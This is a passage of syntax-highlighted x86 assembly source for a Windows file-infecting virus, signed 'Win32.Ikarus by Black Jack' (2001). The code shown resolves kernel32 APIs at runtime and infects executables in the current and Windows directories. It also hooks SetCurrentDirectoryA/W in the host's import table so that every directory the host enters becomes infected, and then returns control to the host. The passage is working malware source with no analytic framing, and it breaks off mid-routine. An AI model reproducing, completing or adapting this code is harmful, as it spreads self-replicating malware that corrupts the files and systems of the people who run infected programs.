        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n_GetProcAddress</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ESI=pointer to api name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">l_GetProcAddress</span><span class="sc0">                   </span><span class="sc1">; ECX=length of api name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                     </span><span class="sc1">; clear direction flag</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                               </span><span class="sc1">; compare api names</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                    </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">found_GetProcAddress</span><span class="sc0">                 </span><span class="sc1">; found GetProcAddress ?</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; if not, try next api</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; all APIs done ?</span><span class="sc0">
        </span><span class="sc6">JL</span><span class="sc0"> </span><span class="sc5">search_loop</span><span class="sc0">

</span><span class="sc5">not_found_GetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">return_to_host</span><span class="sc0">                      </span><span class="sc1">; restore host</span><span class="sc0">

</span><span class="sc5">found_GetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDX=AddressOfOrdinals RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EDX=AddressOfOrdinals VA</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ECX=API ordinal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; EDX=AddressOfFunctions RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EDX=AddressOfFunctions VA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; EDX=API RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EDX=API VA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddress</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; store it</span><span class="sc0">


</span><span class="sc5">got_GetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_APIname_pointers</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_API_RVAs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">number_of_kernel32_APIs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">get_kernel32_APIs_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; save api counter</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; EAX=0</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; AX=next api name RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">; EAX=next api name VA</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; api name VA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; kernel32 base address</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddress</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; store api address</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; restore api counter</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; last api not found ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">return_to_host</span><span class="sc0">                       </span><span class="sc1">; if so, return to host</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">get_kernel32_APIs_loop</span><span class="sc0">             </span><span class="sc1">; do next api</span><span class="sc0">

</span><span class="sc1">; ----- INFECT CURRENT DIR &amp; WINDOWS DIR ------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">curdir</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get current directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                </span><span class="sc1">; get windows directory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">windir</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">windir</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; change to windows direcory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; using our own API hook, so</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA_hook</span><span class="sc0">          </span><span class="sc1">; all files in there will</span><span class="sc0">
                                                </span><span class="sc1">; become infected</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">curdir</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; change back to old directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; using our own API hook, so</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA_hook</span><span class="sc0">          </span><span class="sc1">; all files in there will</span><span class="sc0">
                                                </span><span class="sc1">; become infected</span><span class="sc0">

</span><span class="sc1">; ----- GO PER-PROCESS-RESIDENT ---------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EAX=our own imagebase</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32descr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX=K32 import descriptor</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; no K32 import descriptor ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">no_perprocess_residency</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; EDX=RVA to API names array</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; not existant ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">no_perprocess_residency</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; RVA-&gt;VA</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n_SetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">search_API_in_imports</span><span class="sc0">              </span><span class="sc1">; search this API in imports</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; found ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">no_SetCurrentDirectoryA_hook</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryA_hook</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">make_writeable</span><span class="sc0">                     </span><span class="sc1">; make this page writeable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">; hook this API</span><span class="sc0">
</span><span class="sc5">no_SetCurrentDirectoryA_hook</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">n_SetCurrentDirectoryW</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">search_API_in_imports</span><span class="sc0">              </span><span class="sc1">; search this API in imports</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; found ?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">no_SetCurrentDirectoryW_hook</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryW_hook</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">make_writeable</span><span class="sc0">                     </span><span class="sc1">; make this page writeable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">; hook this API</span><span class="sc0">
</span><span class="sc5">no_SetCurrentDirectoryW_hook</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">no_perprocess_residency</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">return_to_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; remove SEH</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">                                    </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                    </span><span class="sc1">; restore flags</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                                 </span><span class="sc1">; mov eax, imm32</span><span class="sc0">
</span><span class="sc5">host_entry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                                 </span><span class="sc1">; true host entry VA</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; jump to host</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Ikarus by Black Jack"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"written in Austria in the year 2001"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ----- API HOOKS -----------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">SetCurrentDirectoryA_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">delta_to_EAX</span><span class="sc0">                       </span><span class="sc1">; get delta offset to EAX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">return_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; store return address</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call original</span><span class="sc0">
                                                </span><span class="sc1">; API handler to change dir</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryX_hook</span><span class="sc0">           </span><span class="sc1">; go on with general handler</span><span class="sc0">

</span><span class="sc5">SetCurrentDirectoryW_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">delta_to_EAX</span><span class="sc0">                       </span><span class="sc1">; get delta offset to EAC</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">return_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; store return address</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryW</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call original</span><span class="sc0">
                                                </span><span class="sc1">; API handler to change dir</span><span class="sc0">

</span><span class="sc5">SetCurrentDirectoryX_hook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; make room on stack for</span><span class="sc0">
                                                </span><span class="sc1">; return address</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">; store flags</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                   </span><span class="sc1">; store all registers</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">delta_to_EAX</span><span class="sc0">                       </span><span class="sc1">; get delta offset to EAX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">; delta offset to EBP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">return_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; set return address on stack</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">infect_directory</span><span class="sc0">                   </span><span class="sc1">; infect new directory</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                    </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                    </span><span class="sc1">; restore all flags</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">delta_to_EAX</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">hook_next</span><span class="sc0">                          </span><span class="sc1">; get delta offset</span><span class="sc0">
</span><span class="sc5">hook_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">hook_next</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">; ----- SEARCH APIs IN THE IMPORT TABLE -------------------------------------</span><span class="sc0">

</span><span class="sc5">search_API_in_imports</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">search_api_in_imports_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">api_not_found</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

</span><span class="sc5">cmp_api_name_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">api_name_equal</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">cmp_api_name_loop</span><span class="sc0">

</span><span class="sc5">api_name_not_equal</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">search_api_in_imports_loop</span><span class="sc0">

</span><span class="sc5">api_name_equal</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">api_not_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; ----- INFECT CURRENT DIRECTORY --------------------------------------------</span><span class="sc0">

</span><span class="sc5">infect_directory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">find_data</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; address of FindData struc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; address of filemask</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">exit_infect_directory</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
</span><span class="sc5">infect_found_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">

</span><span class="sc5">find_next</span><span class="sc4">:</span><span class="sc0">
